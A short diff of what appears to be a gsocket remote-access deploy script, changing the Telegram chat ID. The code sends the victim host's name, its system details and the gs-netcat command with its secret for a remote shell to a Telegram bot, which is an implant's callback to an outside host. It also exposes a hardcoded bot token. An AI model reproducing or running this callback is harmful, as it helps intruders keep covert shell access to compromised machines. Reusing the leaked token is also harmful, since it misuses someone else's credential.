@@ -90,7 +90,7 @@ unset gs_deploy_webhook
 msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 ### Telegram
  GS_TG_TOKEN="8490027843:AAFCp1DuM-jHEZgc531GtEBrTd9sMO67ZZk"
- GS_TG_CHATID="-5174930108"
+ GS_TG_CHATID="-1003854028587"
 [[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
 	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
